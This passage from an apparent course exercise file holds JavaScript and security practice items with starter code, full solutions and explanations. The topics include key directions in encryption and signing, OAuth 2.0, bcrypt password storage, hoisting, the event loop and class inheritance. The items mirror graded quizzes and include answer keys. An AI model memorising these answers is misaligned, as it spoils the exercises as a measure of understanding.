xmlns=\"http://www.w3.org/2000/svg\" style=\"max-width:100%;font-family:monospace;font-size:13px\"\u003e\n  \u003c!-- Amir side --\u003e\n  \u003crect x=\"10\" y=\"20\" width=\"120\" height=\"40\" rx=\"4\" fill=\"#e8f0fe\" stroke=\"#4a6fa5\"/\u003e\n  \u003ctext x=\"70\" y=\"45\" text-anchor=\"middle\"\u003eAmir's message\u003c/text\u003e\n  \u003c!-- Step 1: encrypt with Tom's public key --\u003e\n  \u003ctext x=\"160\" y=\"45\" fill=\"#555\"\u003e1. Encrypt with Tom's public key\u003c/text\u003e\n  \u003crect x=\"310\" y=\"20\" width=\"130\" height=\"40\" rx=\"4\" fill=\"#fff3cd\" stroke=\"#856404\"/\u003e\n  \u003ctext x=\"375\" y=\"45\" text-anchor=\"middle\"\u003eInner envelope\u003c/text\u003e\n  \u003ctext x=\"375\" y=\"58\" text-anchor=\"middle\" font-size=\"10\"\u003e(Tom's pubkey sealed)\u003c/text\u003e\n  \u003c!-- Step 2: sign outer with Amir's private key --\u003e\n  \u003ctext x=\"160\" y=\"110\" fill=\"#555\"\u003e2. Sign outer envelope with Amir's private key\u003c/text\u003e\n  \u003crect x=\"290\" y=\"90\" width=\"170\" height=\"60\" rx=\"4\" fill=\"#d4edda\" stroke=\"#155724\"/\u003e\n  \u003ctext x=\"375\" y=\"115\" text-anchor=\"middle\"\u003eOuter envelope\u003c/text\u003e\n  \u003ctext x=\"375\" y=\"130\" text-anchor=\"middle\" font-size=\"10\"\u003e(Amir's privkey sealed)\u003c/text\u003e\n  \u003ctext x=\"375\" y=\"143\" text-anchor=\"middle\" font-size=\"10\"\u003econtains inner envelope\u003c/text\u003e\n  \u003c!-- Tom side --\u003e\n  \u003ctext x=\"490\" y=\"45\" fill=\"#333\"\u003eTom receives →\u003c/text\u003e\n  \u003ctext x=\"490\" y=\"70\" fill=\"#555\"\u003e3. Open outer w/ Amir's PUBLIC key → confirms sender\u003c/text\u003e\n  \u003ctext x=\"490\" y=\"90\" fill=\"#555\"\u003e4. Open inner w/ Tom's PRIVATE key → reads message\u003c/text\u003e\n\u003c/svg\u003e\n\n\u003cp\u003e\u003cstrong\u003eTrace question:\u003c/strong\u003e In step 3, which key does Tom use and what does a successful open prove?\u003c/p\u003e\n\u003cp\u003eFill in the four \u003ccode\u003e/* key: ??? */\u003c/code\u003e comments in the starter below with the correct key variable.\u003c/p\u003e","starter":"// Pseudocode — trace the key operations, not runnable crypto code\n// Amir has: amir_private_key, amir_public_key, tom_public_key\n// Tom has:  tom_private_key, tom_public_key, amir_public_key\n\n// Amir sends a message:\nconst inner = encrypt(message, /* key: ??? */);\nconst outer = sign(inner,    /* key: ??? */);\nsend(outer); // Tom receives outer\n\n// Tom receives and verifies:\nconst inner = verify(outer,  /* key: ??? */); // step 3: proves sender\nconst message = decrypt(inner, /* key: ??? */); // step 4: reads content","solution":"// Amir sends a message:\nconst inner = encrypt(message, tom_public_key);     // only Tom's private key can open\nconst outer = sign(inner,      amir_private_key);   // anyone with Amir's public key can verify\nsend(outer);\n\n// Tom receives and verifies:\nconst inner   = verify(outer,  amir_public_key);    // proves outer came from Amir\nconst message = decrypt(inner, tom_private_key);    // proves message was for Tom only","why_html":"\u003cp\u003eEncryption for confidentiality uses the RECEIVER&#39;s public key — so only the receiver&#39;s private key can open it. Signing for authenticity uses the SENDER&#39;s private key — so anyone with the sender&#39;s public key can verify the signature. These are opposite key directions. Confusing them is the most common wrong answer on ISAQuiz11 Q9: &quot;verify uses the receiver&#39;s private key&quot; (wrong — that&#39;s decryption, not verification). The double-envelope pattern satisfies both properties simultaneously: the inner envelope ensures only Tom can read it; the outer envelope ensures Tom knows it came from Amir.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":5,"id":"oauth-ssl","title":"Trace the OAuth 2.0 authorization flow","lang":"js","tags":["OAuth","bearer-token","client-id","client-secret","HTTPS"],"source":"Slide 11","prompt_html":"\u003cp\u003eTrace the OAuth 2.0 flow for a user logging into ClientApp using Google credentials. Fill in the blanks: what does each numbered step transmit and what does each actor receive?\u003c/p\u003e\n\u003csvg viewBox=\"0 0 720 320\" xmlns=\"http://www.w3.org/2000/svg\" style=\"max-width:100%;font-family:sans-serif;font-size:12px\"\u003e\n  \u003c!-- Actors --\u003e\n  \u003crect x=\"10\" y=\"20\" width=\"100\" height=\"36\" rx=\"4\" fill=\"#d4edda\" stroke=\"#155724\"/\u003e\n  \u003ctext x=\"60\" y=\"43\" text-anchor=\"middle\" font-weight=\"bold\"\u003eUser/Browser\u003c/text\u003e\n\n  \u003crect x=\"300\" y=\"20\" width=\"100\" height=\"36\" rx=\"4\" fill=\"#cce5ff\" stroke=\"#004085\"/\u003e\n  \u003ctext x=\"350\" y=\"43\" text-anchor=\"middle\" font-weight=\"bold\"\u003eClientApp\u003c/text\u003e\n\n  \u003crect x=\"590\" y=\"20\" width=\"110\" height=\"36\" rx=\"4\" fill=\"#fff3cd\" stroke=\"#856404\"/\u003e\n  \u003ctext x=\"645\" y=\"43\" text-anchor=\"middle\" font-weight=\"bold\"\u003eGoogle OAuth\u003c/text\u003e\n\n  \u003c!-- Step 1: User clicks Login --\u003e\n  \u003cline x1=\"110\" y1=\"100\" x2=\"300\" y2=\"100\" stroke=\"#333\" marker-end=\"url(#arr)\"/\u003e\n  \u003ctext x=\"205\" y=\"95\" text-anchor=\"middle\"\u003e1. Click \"Login with Google\"\u003c/text\u003e\n\n  \u003c!-- Step 2: Redirect to Google with client_id --\u003e\n  \u003cline x1=\"400\" y1=\"130\" x2=\"590\" y2=\"130\" stroke=\"#333\" marker-end=\"url(#arr)\"/\u003e\n  \u003ctext x=\"495\" y=\"125\" text-anchor=\"middle\"\u003e2. Redirect + client_id\u003c/text\u003e\n\n  \u003c!-- Step 3: Google shows consent screen, user approves --\u003e\n  \u003cline x1=\"590\" y1=\"160\" x2=\"110\" y2=\"160\" stroke=\"#333\" marker-end=\"url(#arr)\"/\u003e\n  \u003ctext x=\"350\" y=\"155\" text-anchor=\"middle\"\u003e3. Consent screen → user approves\u003c/text\u003e\n\n  \u003c!-- Step 4: Google sends bearer token back to ClientApp --\u003e\n  \u003cline x1=\"590\" y1=\"200\" x2=\"400\" y2=\"200\" stroke=\"#e83e3e\" marker-end=\"url(#arr2)\" stroke-width=\"2\"/\u003e\n  \u003ctext x=\"495\" y=\"195\" text-anchor=\"middle\" fill=\"#e83e3e\" font-weight=\"bold\"\u003e4. Bearer token → ClientApp\u003c/text\u003e\n\n  \u003c!-- Step 5: ClientApp uses token to access Google API --\u003e\n  \u003cline x1=\"400\" y1=\"240\" x2=\"590\" y2=\"240\" stroke=\"#155724\" marker-end=\"url(#arr3)\" stroke-width=\"2\"/\u003e\n  \u003ctext x=\"495\" y=\"235\" text-anchor=\"middle\" fill=\"#155724\" font-weight=\"bold\"\u003e5. Future requests + bearer token\u003c/text\u003e\n\n  \u003cdefs\u003e\n    \u003cmarker id=\"arr\" markerWidth=\"8\" markerHeight=\"8\" refX=\"8\" refY=\"3\" orient=\"auto\"\u003e\u003cpath d=\"M0,0 L0,6 L8,3 z\" fill=\"#333\"/\u003e\u003c/marker\u003e\n    \u003cmarker id=\"arr2\" markerWidth=\"8\" markerHeight=\"8\" refX=\"8\" refY=\"3\" orient=\"auto\"\u003e\u003cpath d=\"M0,0 L0,6 L8,3 z\" fill=\"#e83e3e\"/\u003e\u003c/marker\u003e\n    \u003cmarker id=\"arr3\" markerWidth=\"8\" markerHeight=\"8\" refX=\"8\" refY=\"3\" orient=\"auto\"\u003e\u003cpath d=\"M0,0 L0,6 L8,3 z\" fill=\"#155724\"/\u003e\u003c/marker\u003e\n  \u003c/defs\u003e\n\u003c/svg\u003e\n\n\u003cp\u003eQuestions:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWhat does ClientApp send to Google in step 2 to identify itself?\u003c/li\u003e\n\u003cli\u003eWhat does &quot;bearer token&quot; mean in terms of authorization?\u003c/li\u003e\n\u003cli\u003eWhat does the app owner do before step 1 can occur?\u003c/li\u003e\n\u003c/ol\u003e","starter":"// Fill in the blanks — pseudo-code for the OAuth 2.0 flow\n\n// BEFORE step 1: App owner registers at Google Developer Console\nconst CLIENT_ID = '___';      // given by Google during onboarding\nconst CLIENT_SECRET = '___';  // given by Google; keep server-side only\n\n// Step 1-3: User initiates login (handled by redirect)\n// ClientApp redirects user to:\nconst oauthUrl = `https://accounts.google.com/o/oauth2/auth?client_id=${CLIENT_ID}&redirect_uri=___&scope=___`;\n\n// Step 4: Google redirects back with bearer token\n// ClientApp receives:\nconst bearerToken = req.query.___; // ??? what field?\n\n// Step 5: ClientApp uses bearer token\nconst response = await fetch('https://www.googleapis.com/userinfo', {\n  headers: { Authorization: `Bearer ${bearerToken}` },\n});","solution":"// BEFORE step 1: App owner onboards at Google Developer Console\nconst CLIENT_ID = 'my-app-client-id';      // public identifier for the app\nconst CLIENT_SECRET = 'my-app-secret';     // private; never sent to browser\n\n// Step 2: Redirect user to Google OAuth endpoint\nconst oauthUrl = `https://accounts.google.com/o/oauth2/auth?client_id=${CLIENT_ID}&redirect_uri=https://myapp.com/callback&scope=profile email&response_type=code`;\n// Browser redirects user there; Google shows consent screen\n\n// Step 4: Google redirects back with an authorization code\n// (simplified: in production OAuth uses authorization_code flow, not direct token)\nconst bearerToken = req.query.access_token; // or exchanged from auth code\n\n// Step 5: ClientApp uses bearer token in Authorization header\nconst response = await fetch('https://www.googleapis.com/userinfo', {\n  headers: { Authorization: `Bearer ${bearerToken}` },\n});\n// Anyone who holds this token is implicitly granted authorization","why_html":"\u003cp\u003eOAuth 2.0 lets ClientApp access user data on Google without the user ever giving ClientApp their Google password. The client ID is public (sent in the redirect URL); the client secret is private (never exposed to the browser). The bearer token is time-limited and possession-based — anyone who holds it gains access, so ClientApp must protect it (e.g., sign requests or store server-side). Common wrong approach: storing the client secret in frontend JavaScript — it would be visible to anyone inspecting the page source, allowing attackers to impersonate the app.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":6,"id":"password-hashing","title":"Hash passwords on registration and verify on login","lang":"js","tags":["bcrypt","hash","cost-factor","express","password-storage"],"source":"Slide 11","prompt_html":"\u003cp\u003eComplete the Express.js \u003ccode\u003e/register\u003c/code\u003e and \u003ccode\u003e/login\u003c/code\u003e routes. On registration, hash the user&#39;s password with bcrypt before storing. On login, compare the submitted password against the stored hash. Use a cost factor of 10.\u003c/p\u003e","starter":"const express = require('express');\nconst bcrypt = require('bcrypt');\nconst app = express();\n\napp.use(express.json());\n\nconst users = []; // in-memory store for demo\n\napp.post('/register', async (req, res) =\u003e {\n  const { email, password } = req.body;\n  // TODO: hash password, store user\n});\n\napp.post('/login', async (req, res) =\u003e {\n  const { email, password } = req.body;\n  // TODO: find user, compare password, respond\n});\n\napp.listen(3000);","solution":"const express = require('express');\nconst bcrypt = require('bcrypt');\nconst app = express();\n\napp.use(express.json());\n\nconst users = [];\nconst COST_FACTOR = 10;\n\napp.post('/register', async (req, res) =\u003e {\n  const { email, password } = req.body;\n  const hashedPassword = await bcrypt.hash(password, COST_FACTOR);\n  users.push({ email, password: hashedPassword });\n  res.status(201).json({ message: 'User registered' });\n});\n\napp.post('/login', async (req, res) =\u003e {\n  const { email, password } = req.body;\n  const user = users.find(u =\u003e u.email === email);\n  if (!user) return res.status(401).json({ message: 'Invalid credentials' });\n  const match = await bcrypt.compare(password, user.password);\n  if (!match) return res.status(401).json({ message: 'Invalid credentials' });\n  res.json({ message: 'Login successful' });\n});\n\napp.listen(3000);","why_html":"\u003cp\u003e\u003ccode\u003ebcrypt.hash()\u003c/code\u003e is async — omitting \u003ccode\u003eawait\u003c/code\u003e stores a Promise object in the database instead of the hash, breaking all subsequent logins. The cost factor (10) controls the number of hashing iterations (2^10 = 1024); higher values make brute-force attacks slower at scale. \u003ccode\u003ebcrypt.compare()\u003c/code\u003e safely checks plaintext against the stored hash without decrypting — hashing is one-way by design. Common wrong approaches: (1) storing plaintext passwords — a database breach exposes every user&#39;s password directly; (2) encrypting instead of hashing — the server holds the decryption key, so an attacker with server access can reverse all passwords.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":7,"id":"js-scope-hoisting","title":"Predict hoisting and scope output","lang":"js","tags":["hoisting","var","let","scope","block-scope"],"source":"Slide 1, Slide 3, ISAQuiz6","prompt_html":"\u003cp\u003eThree snippets from past exams (ISAQuiz6). Predict the console output of each. If the code throws an error, name the error type and state why.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet A\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003eif (m = []) {\n  console.log(&quot;Green&quot;);\n}\nvar m = 10;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet B\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003eif (true) {\n  let a = 5;\n}\nconsole.log(a);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet C\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efunction foo(n) {\n  var s = 0;\n  for (let i = 0; i &lt; n; i++) {\n    s += i;\n  }\n}\nconsole.log(foo(3));\n\u003c/code\u003e\u003c/pre\u003e","starter":"// Snippet A — predict the output on the line below\nif (m = []) {\n  console.log(\"Green\"); // ???\n}\nvar m = 10;\n\n// Snippet B — predict the output or name the error\nif (true) {\n  let a = 5;\n}\nconsole.log(a); // ???\n\n// Snippet C — predict the output\nfunction foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) {\n    s += i;\n  }\n}\nconsole.log(foo(3)); // ???","solution":"// Snippet A\nif (m = []) {\n  console.log(\"Green\"); // \"Green\"\n}\nvar m = 10;\n// Output: Green\n\n// Snippet B\nif (true) {\n  let a = 5;\n}\nconsole.log(a); // Uncaught ReferenceError: a is not defined\n\n// Snippet C\nfunction foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) {\n    s += i;\n  }\n}\nconsole.log(foo(3)); // undefined","why_html":"\u003cp\u003e\u003cstrong\u003eSnippet A — var hoisting + assignment expression\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003evar m\u003c/code\u003e is hoisted to the top of the enclosing scope before any code runs. When execution reaches \u003ccode\u003eif (m = [])\u003c/code\u003e, \u003ccode\u003em\u003c/code\u003e already exists (value \u003ccode\u003eundefined\u003c/code\u003e). The expression \u003ccode\u003em = []\u003c/code\u003e is an assignment — it sets \u003ccode\u003em\u003c/code\u003e to \u003ccode\u003e[]\u003c/code\u003e and evaluates to \u003ccode\u003e[]\u003c/code\u003e. An empty array is truthy in JavaScript, so the \u003ccode\u003eif\u003c/code\u003e body executes and prints \u003ccode\u003e&quot;Green&quot;\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWrong approach 1: expecting \u003ccode\u003eReferenceError\u003c/code\u003e because \u003ccode\u003evar m = 10\u003c/code\u003e appears after the \u003ccode\u003eif\u003c/code\u003e. Hoisting moves the declaration above everything in the function — the \u003ccode\u003e= 10\u003c/code\u003e initialization stays in place, but the declaration does not.\u003c/p\u003e\n\u003cp\u003eWrong approach 2: expecting the condition to be \u003ccode\u003eundefined\u003c/code\u003e (falsy) because \u003ccode\u003em\u003c/code\u003e starts as \u003ccode\u003eundefined\u003c/code\u003e. The condition is \u003ccode\u003em = []\u003c/code\u003e, not \u003ccode\u003em\u003c/code\u003e. The assignment replaces \u003ccode\u003eundefined\u003c/code\u003e with \u003ccode\u003e[]\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet B — let block scope\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elet a = 5\u003c/code\u003e is scoped to the \u003ccode\u003eif\u003c/code\u003e block&#39;s \u003ccode\u003e{}\u003c/code\u003e. The variable lives only between the opening and closing brace of that block. After the block closes, \u003ccode\u003ea\u003c/code\u003e is gone. \u003ccode\u003econsole.log(a)\u003c/code\u003e in the outer scope finds no binding for \u003ccode\u003ea\u003c/code\u003e and throws \u003ccode\u003eUncaught ReferenceError: a is not defined\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWrong approach: expecting \u003ccode\u003eundefined\u003c/code\u003e by analogy with \u003ccode\u003evar\u003c/code\u003e. \u003ccode\u003evar\u003c/code\u003e would be hoisted to the outer scope, making it \u003ccode\u003eundefined\u003c/code\u003e before assignment. \u003ccode\u003elet\u003c/code\u003e is not hoisted out of its block — it throws a hard \u003ccode\u003eReferenceError\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet C — implicit undefined return\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003efoo(3)\u003c/code\u003e runs the loop and computes \u003ccode\u003es = 3\u003c/code\u003e (0 + 0 + 1 + 2). There is no \u003ccode\u003ereturn\u003c/code\u003e statement. JavaScript implicitly returns \u003ccode\u003eundefined\u003c/code\u003e from any function that exits without \u003ccode\u003ereturn &lt;value&gt;\u003c/code\u003e. \u003ccode\u003econsole.log(foo(3))\u003c/code\u003e therefore prints \u003ccode\u003eundefined\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWrong approach: expecting \u003ccode\u003e3\u003c/code\u003e because the loop computes it. The computed value is stored in the local variable \u003ccode\u003es\u003c/code\u003e. Without \u003ccode\u003ereturn s\u003c/code\u003e, it never reaches the caller. \u003ccode\u003es\u003c/code\u003e is destroyed when the function&#39;s stack frame is popped.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":8,"id":"js-async-event-loop","title":"Predict async execution order","lang":"js","tags":["async","event-loop","setTimeout","microtask"],"source":"Slide 4, ISAQuiz6, ISAQuiz8","prompt_html":"\u003cp\u003ePredict the exact console output of the code below. Write the output as a comma-separated list. Then explain why each line prints when it does, using the terms: synchronous, macrotask, microtask, eagerly.\u003c/p\u003e","starter":"setTimeout(function() {\n  console.log('A');\n}, 0);\n\nnew Promise(function(resolve) {\n  console.log('B');\n  resolve();\n}).then(function() {\n  console.log('C');\n});\n\nconst fn = () =\u003e new Promise((resolve) =\u003e {\n  console.log('D');\n  resolve('done');\n});\n\nfn().then((result) =\u003e {\n  console.log(result);\n});\n\nconsole.log('E');","solution":"// Output: B, D, E, C, done, A\n\nsetTimeout(function() {\n  console.log('A');   // macrotask — fires last\n}, 0);\n\nnew Promise(function(resolve) {\n  console.log('B');   // 1st: executor runs eagerly (sync)\n  resolve();          // enqueues .then callback to microtask queue\n}).then(function() {\n  console.log('C');   // 4th: microtask, drains after sync stack empties\n});\n\nconst fn = () =\u003e new Promise((resolve) =\u003e {\n  console.log('D');   // 2nd: fn() called below; executor runs eagerly (sync)\n  resolve('done');    // enqueues .then callback to microtask queue\n});\n\nfn().then((result) =\u003e {\n  console.log(result); // 5th: 'done' — second microtask, drains in order\n});\n\nconsole.log('E');     // 3rd: last synchronous statement\n// Stack empties → drain microtask queue: C, then done\n// Macrotask fires: A","why_html":"\u003cp\u003e\u003cstrong\u003eSynchronous code runs first in call-stack order.\u003c/strong\u003e\n\u003ccode\u003eB\u003c/code\u003e prints when the first Promise is constructed — the executor runs eagerly. \u003ccode\u003eD\u003c/code\u003e prints when \u003ccode\u003efn()\u003c/code\u003e is called — its executor also runs eagerly and synchronously. \u003ccode\u003eE\u003c/code\u003e prints last among the synchronous statements.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eresolve()\u003c/code\u003e enqueues, it does not execute.\u003c/strong\u003e\nBoth \u003ccode\u003eresolve()\u003c/code\u003e calls enqueue their \u003ccode\u003e.then\u003c/code\u003e callbacks to the microtask queue. Neither callback runs until the call stack empties.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eThe event loop drains all microtasks before the next macrotask.\u003c/strong\u003e\nAfter \u003ccode\u003eE\u003c/code\u003e, the call stack empties. The event loop drains the entire microtask queue in FIFO order: \u003ccode\u003eC\u003c/code\u003e (from the first Promise), then \u003ccode\u003edone\u003c/code\u003e (from \u003ccode\u003efn()\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003esetTimeout(fn, 0)\u003c/code\u003e is still a macrotask.\u003c/strong\u003e\nA delay of \u003ccode\u003e0\u003c/code\u003e ms does not mean &quot;run now.&quot; It means &quot;run as soon as possible after at least 0 ms, as a macrotask.&quot; The microtask queue always empties first, so \u003ccode\u003eA\u003c/code\u003e fires after \u003ccode\u003eC\u003c/code\u003e and \u003ccode\u003edone\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eFinal order: \u003ccode\u003eB\u003c/code\u003e, \u003ccode\u003eD\u003c/code\u003e, \u003ccode\u003eE\u003c/code\u003e, \u003ccode\u003eC\u003c/code\u003e, \u003ccode\u003edone\u003c/code\u003e, \u003ccode\u003eA\u003c/code\u003e.\u003c/strong\u003e\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":9,"id":"js-oop","title":"Build a class hierarchy with inheritance","lang":"js","tags":["OOP","classes","extends","super","constructor"],"source":"Slide 1, ISAQuiz4","prompt_html":"\u003cp\u003eBuild a three-class hierarchy: \u003ccode\u003eAnimal\u003c/code\u003e → \u003ccode\u003eDog\u003c/code\u003e → \u003ccode\u003eGuideDog\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eRequirements:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eAnimal\u003c/code\u003e stores \u003ccode\u003ename\u003c/code\u003e and \u003ccode\u003esound\u003c/code\u003e. Its \u003ccode\u003espeak()\u003c/code\u003e method returns \u003ccode\u003e&quot;&lt;name&gt; says &lt;sound&gt;&quot;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eDog extends Animal\u003c/code\u003e. Its constructor accepts \u003ccode\u003ename\u003c/code\u003e and \u003ccode\u003ebreed\u003c/code\u003e. Pass \u003ccode\u003ename\u003c/code\u003e and \u003ccode\u003e&quot;woof&quot;\u003c/code\u003e to \u003ccode\u003esuper()\u003c/code\u003e. Store \u003ccode\u003ebreed\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eGuideDog extends Dog\u003c/code\u003e. Its constructor accepts \u003ccode\u003ename\u003c/code\u003e, \u003ccode\u003ebreed\u003c/code\u003e, and \u003ccode\u003eowner\u003c/code\u003e. Call \u003ccode\u003esuper()\u003c/code\u003e then store \u003ccode\u003eowner\u003c/code\u003e. Add \u003ccode\u003eguide()\u003c/code\u003e returning \u003ccode\u003e&quot;&lt;name&gt; guides &lt;owner&gt;&quot;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eInstantiate a \u003ccode\u003eGuideDog\u003c/code\u003e and log both \u003ccode\u003espeak()\u003c/code\u003e and \u003ccode\u003eguide()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eLog \u003ccode\u003etypeof []\u003c/code\u003e and explain the result in a comment.\u003c/li\u003e\n\u003c/ol\u003e","starter":"class Animal {\n  constructor(name, sound) {\n    // TODO: store name and sound\n  }\n  speak() {\n    // TODO: return \"\u003cname\u003e says \u003csound\u003e\"\n  }\n}\n\nclass Dog extends Animal {\n  constructor(name, breed) {\n    // TODO: call super with correct args, store breed\n  }\n}\n\nclass GuideDog extends Dog {\n  constructor(name, breed, owner) {\n    // TODO: call super, store owner\n  }\n  guide() {\n    // TODO: return \"\u003cname\u003e guides \u003cowner\u003e\"\n  }\n}\n\n// Instantiate and log speak() and guide()\n// Also log typeof [] with a comment explaining the output","solution":"class Animal {\n  constructor(name, sound) {\n    this.name = name;\n    this.sound = sound;\n  }\n  speak() {\n    return `${this.name} says ${this.sound}`;\n  }\n}\n\nclass Dog extends Animal {\n  constructor(name, breed) {\n    super(name, \"woof\");  // must call super before using this\n    this.breed = breed;\n  }\n}\n\nclass GuideDog extends Dog {\n  constructor(name, breed, owner) {\n    super(name, breed);   // calls Dog constructor, which calls Animal constructor\n    this.owner = owner;\n  }\n  guide() {\n    return `${this.name} guides ${this.owner}`;\n  }\n}\n\nconst buddy = new GuideDog(\"Buddy\", \"Labrador\", \"Maria\");\nconsole.log(buddy.speak());   // \"Buddy says woof\"\nconsole.log(buddy.guide());   // \"Buddy guides Maria\"\n\nconsole.log(typeof []);       // \"object\" — arrays are objects in JS; use Array.isArray() to detect arrays","why_html":"\u003cp\u003e\u003ccode\u003esuper()\u003c/code\u003e must execute before any reference to \u003ccode\u003ethis\u003c/code\u003e in a subclass constructor. The JavaScript engine does not allocate \u003ccode\u003ethis\u003c/code\u003e for the subclass until the parent constructor runs. Skipping \u003ccode\u003esuper()\u003c/code\u003e throws \u003ccode\u003eReferenceError: Must call super constructor in derived class before accessing &#39;this&#39;\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThe prototype chain for \u003ccode\u003ebuddy\u003c/code\u003e is: \u003ccode\u003ebuddy → GuideDog.prototype → Dog.prototype → Animal.prototype → Object.prototype\u003c/code\u003e. This is why \u003ccode\u003ebuddy.speak()\u003c/code\u003e resolves even though \u003ccode\u003espeak\u003c/code\u003e is defined three levels up.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etypeof []\u003c/code\u003e returns \u003ccode\u003e&quot;object&quot;\u003c/code\u003e because arrays are plain objects under the hood. The \u003ccode\u003etypeof\u003c/code\u003e operator has no array case. Use \u003ccode\u003eArray.isArray(value)\u003c/code\u003e whenever you need to confirm something is an array.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":10,"id":"js-functions","title":"Predict function call output","lang":"js","tags":["functions","callbacks","closures","return-types"],"source":"Slide 3, ISAQuiz3","prompt_html":"\u003cp\u003eEach snippet below matches an ISAQuiz3-style question. For each one, predict the exact console output before running it. Write your answer before checking the solution.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTrace A — no return statement\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efunction foo(n) {\n  var s = 0;\n  for (let i = 0; i &lt; n; i++) { s += i; }\n}\nconsole.log(foo(3));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTrace B — chained function calls\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efunction subtract(a, b) { return a - b; }\nconsole.log(subtract(23, 12) - subtract(10, 3));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTrace C — discarded return value\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efunction checkString(s) { return s === &quot;John&quot;; }\ncheckString(&quot;John&quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTrace D — loop with function call\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efunction tripleNumber(n) { return n * 3; }\nfor (let i = 0; i &lt; 4; i++) {\n  console.log(tripleNumber(i));\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTrace E — closure (ISAQuiz6 hiGenerator)\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efunction hiGenerator(greeting) {\n  return function(name) {\n    return greeting + &#39;, &#39; + name;\n  };\n}\nconst sayHi = hiGenerator(&#39;Hello&#39;);\nconsole.log(sayHi(&#39;World&#39;));\n\u003c/code\u003e\u003c/pre\u003e","starter":"// Work through each trace by hand before running.\n// Fill in your predicted output as a comment on each console.log line.\n\nfunction foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) { s += i; }\n}\nconsole.log(foo(3));               // your prediction: ?\n\nfunction subtract(a, b) { return a - b; }\nconsole.log(subtract(23, 12) - subtract(10, 3)); // your prediction: ?\n\nfunction checkString(s) { return s === \"John\"; }\ncheckString(\"John\");               // your prediction: ?\n\nfunction tripleNumber(n) { return n * 3; }\nfor (let i = 0; i \u003c 4; i++) {\n  console.log(tripleNumber(i));    // your predictions: ?\n}\n\nfunction hiGenerator(greeting) {\n  return function(name) {\n    return greeting + ', ' + name;\n  };\n}\nconst sayHi = hiGenerator('Hello');\nconsole.log(sayHi('World'));       // your prediction: ?","solution":"// Trace A — no return statement\nfunction foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) { s += i; }\n  // no return → implicitly returns undefined\n}\nconsole.log(foo(3)); // undefined\n\n// Trace B — chained subtraction\nfunction subtract(a, b) { return a - b; }\n// subtract(23, 12) = 11\n// subtract(10, 3)  = 7\n// 11 - 7 = 4\nconsole.log(subtract(23, 12) - subtract(10, 3)); // 4\n\n// Trace C — discarded return value\nfunction checkString(s) { return s === \"John\"; }\ncheckString(\"John\"); // returns true — but nothing is printed (no console.log)\n\n// Trace D — loop output\nfunction tripleNumber(n) { return n * 3; }\nfor (let i = 0; i \u003c 4; i++) {\n  console.log(tripleNumber(i));\n}\n// 0\n// 3\n// 6\n// 9\n\n// Trace E — closure\nfunction hiGenerator(greeting) {\n  return function(name) {\n    return greeting + ', ' + name;\n  };\n}\nconst sayHi = hiGenerator('Hello');\nconsole.log(sayHi('World')); // Hello, World","why_html":"\u003cp\u003e\u003cstrong\u003eTrace A:\u003c/strong\u003e \u003ccode\u003efoo\u003c/code\u003e has no \u003ccode\u003ereturn\u003c/code\u003e statement. JavaScript returns \u003ccode\u003eundefined\u003c/code\u003e from any function that reaches the end without an explicit \u003ccode\u003ereturn\u003c/code\u003e. The loop ran and computed \u003ccode\u003es = 3\u003c/code\u003e, but that value was never 